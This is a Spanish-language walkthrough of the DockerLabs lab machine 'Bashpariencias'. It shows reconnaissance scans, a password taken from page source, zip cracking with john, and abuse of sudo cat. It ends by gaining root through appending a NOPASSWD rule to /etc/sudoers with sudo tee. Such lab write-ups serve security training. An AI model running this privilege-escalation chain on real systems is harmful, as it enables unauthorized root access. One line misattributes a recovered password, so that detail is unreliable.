**#Maquina: Bashpariencias**

**#Dificultad: Media**🟡

**#Web: dockerlabs.es**

-------------------------------------------------------------------------------------------------------------------------------------------------
**Reconocimiento** 👀

```
nmap -p- --open -sS -sC -sV --min-rate 2500 -n -vvv -Pn 172.18.0.3
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 dc:4c:b6:41:c4:e1:72:c3:7d:a0:ed:ca:0e:7a:bc:54 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJt30YsFN09biMjBeb/CjtFEGOnT0fjLdi1hbnr36McoiRqqFDhZVwgBGbLIMxwJ6PSv5rBH2uCHXqSw0QlyUd8=
|   256 66:61:de:8c:fb:5b:3b:f4:fb:b9:ca:69:b1:ac:6e:2e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIN4Xb2tCDj+Wia452jwutmDdphUK2mYCMUJ2+ICKjPnF
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
MAC Address: 02:42:AC:12:00:03 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Tenemos abiertos los puertos 80/http y 22/ssh. Procedemos a verificar el sitio web

![Captura de pantalla 2024-11-07 224408](https://github.com/user-attachments/assets/36a2c101-deaf-4bfe-800b-897c4ee447e3)

Tenemos una pista: **Para aprender hay que ver codigo si o si.** por lo que revisamos el codigo fuente en cada apartado del sitio web y encontramos la contraseña de Rosa en /form.html

![Screenshot_1](https://github.com/user-attachments/assets/661c3d43-996e-4fb5-bd12-96622f1b811d)

Descargamos el contenedor del enlace mega que encontramos en la pagina principal del sitio web

![Screenshot_2](https://github.com/user-attachments/assets/1da68d5f-a4af-42ff-8c09-5391baf9ac76)

Procedemos a montarlo y hacerle un escaneo con Nmap

```
nmap -p- --open -sS -sC -sV --min-rate 2500 -n -vvv -Pn 172.18.0.2
PORT     STATE SERVICE REASON         VERSION
80/tcp   open  http    syn-ack ttl 64 Apache httpd
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache
|_http-title: Leeme
8899/tcp open  ssh     syn-ack ttl 64 OpenSSH 6.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a3:b0:db:99:e4:c6:a5:b2:5d:2b:36:b6:3e:d0:15:00 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBG8ewQjjOoqPtzvXKk1TWfAl1qcSSWPxiXjhtIBNe4nsj15B8XEd/JeFWaJ95ncwxbja1cdarxlmqSLpLZuST5c=
|   256 8f:26:4e:8c:60:28:5c:14:03:b2:45:22:ae:e1:f9:24 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPUJcx6u0eWagjW1BdQxHCwTR1N2CsEUmSLYabG51/J8
MAC Address: 02:42:AC:12:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Identificamos dos puertos abiertos 80/http y 8899/ssh. Miramos el sitio web y es una pagina Apache por defecto, despues de una enumeración de directorios solo encontramos /wordpress pero es un directorio vacío.

![Screenshot_3](https://github.com/user-attachments/assets/68c85f9c-a360-4962-88f1-a7733bb6576f)

```
gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://172.18.0.3 -x php,html,txt
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
[+] Url:                     http://172.18.0.3
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
Starting gobuster in directory enumeration mode
/.html                (Status: 403) [Size: 275]
/.php                 (Status: 403) [Size: 275]
/index.html           (Status: 200) [Size: 10671]
/wordpress            (Status: 301) [Size: 312] [--> http://172.18.0.3/wordpress/]
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
```

Usaremos las credenciales antes encontradas en este servidor.

```
ssh -p8899  rosa@172.18.0.2
The authenticity of host '[172.18.0.2]:8899 ([172.18.0.2]:8899)' can't be established.
ED25519 key fingerprint is SHA256:cAzGwxFNFaiSQunDgfdHmtfdku3N1QR54OTRKR83fyw.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[172.18.0.2]:8899' (ED25519) to the list of known hosts.
rosa@172.18.0.2's password: 
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.6.9-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Sun Jun  9 03:20:54 2024 from 172.23.0.1
rosa@386c2f8d75ba:~$
```

---------------------------------------------------------------------------------------------------------------------------------------------------------

**Explotación**

Una vez dentro del servidor, listamos la carpeta del usuario Rosa y encontramos un directorio con un **-** como nombre, el cual contiene una nota y un archivo .zip que nos vamos a compartir a nuestra maquina local para descifrar la contraseña con John

```
rosa@386c2f8d75ba:/home$ cd rosa/-
rosa@386c2f8d75ba:~/-$ ls
backup_rosa.zip  irresponsable.txt
rosa@386c2f8d75ba:~/-$ cat irresponsable.txt 
Hola rosa soy juan como ya conocemos tus irresposabilidades de otras empresas te voy a dejar mi contraseña en un fichero .zip, captúralo para no volver a ser despedida.
Con cariño pero nos pones a todos en riesgo.
Seguro no trabajaste tambien en Decathlon ....
Un poco de acoso laboral......
rosa@386c2f8d75ba:~/-$ 
```

```
scp -P 8899 rosa@172.18.0.2:/home/rosa/-/backup_rosa.zip /home/kali/Downloads/buscalove
rosa@172.18.0.2's password: 
backup_rosa.zip                                                                                                            100%  215   120.6KB/s   00:00
```

```
zip2john backup_rosa.zip > zip.hash               
ver 1.0 efh 5455 efh 7875 backup_rosa.zip/password.txt PKZIP Encr: 2b chk, TS_chk, cmplen=25, decmplen=13, crc=6A3D5968 ts=1B29 cs=1b29 type=0
                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/Downloads/buscalove]
└─# john zip.hash                                               
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
123123           (backup_rosa.zip/password.txt)     
1g 0:00:00:00 DONE 2/3 (2024-11-08 21:32) 14.28g/s 876900p/s 876900c/s 876900C/s 123456..Peter
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

La contraseña del .zip es 123123, lo descomprimimos y encontramos la contraseña del usuario Juan

```
rosa@386c2f8d75ba:~/-$ unzip backup_rosa.zip 
Archive:  backup_rosa.zip
[backup_rosa.zip] password.txt password: 
 extracting: password.txt            
rosa@386c2f8d75ba:~/-$ cat password.txt 
hackwhitbash
rosa@386c2f8d75ba:~/-$
```

Nos conectamos al usuario Juan y continuamos con la escalada con el comando **sudo -l** y vemos que tenemos dos binarios a ejecutar como el usuario Carlos

```
juan@386c2f8d75ba:/$ sudo -l
Matching Defaults entries for juan on 386c2f8d75ba:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User juan may run the following commands on 386c2f8d75ba:
    (carlos) NOPASSWD: /usr/bin/tree
    (carlos) NOPASSWD: /usr/bin/cat
```

**tree**: El comando tree es una herramienta en línea de comandos que muestra una estructura de directorios y subdirectorios en forma de árbol. Esto generará una vista del directorio actual y todos sus subdirectorios y archivos.

```
juan@386c2f8d75ba:/$ sudo -u carlos /usr/bin/tree /home/carlos
/home/carlos
└── password

1 directory, 1 file
juan@386c2f8d75ba:/$ sudo -u carlos /usr/bin/cat /home/carlos/password
chocolateado
```

Obtenemos la contraseña de juan **chocolateado** por lo que procedemos a conectarnos y continuamos la escalada con **sudo -l** y vemos que podemos ejecutar el binario **tee**.

**tee**: El comando tee en Unix/Linux se utiliza para leer desde la entrada estándar y escribir tanto a la salida estándar como a uno o más archivos. Es útil cuando deseas ver la salida de un comando en la terminal y, al mismo tiempo, guardarla en un archivo.

En este caso, aprovechamos el privilegio para escribir en /etc/sudoers y darnos el usuario root.

```
carlos@386c2f8d75ba:/$ sudo -l
[sudo] password for carlos: 
Matching Defaults entries for carlos on 386c2f8d75ba:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User carlos may run the following commands on 386c2f8d75ba:
    (ALL : NOPASSWD) /usr/bin/tee
carlos@386c2f8d75ba:/$ echo 'carlos ALL=(ALL) NOPASSWD: ALL' | sudo /usr/bin/tee -a /etc/sudoers
carlos ALL=(ALL) NOPASSWD: ALL
carlos@386c2f8d75ba:/$ sudo -i
root@386c2f8d75ba:~# whoami
root
root@386c2f8d75ba:~# id
uid=0(root) gid=0(root) groups=0(root)
root@386c2f8d75ba:~#
```

Somos usuario **root** 🥳

Maquina completada ✅
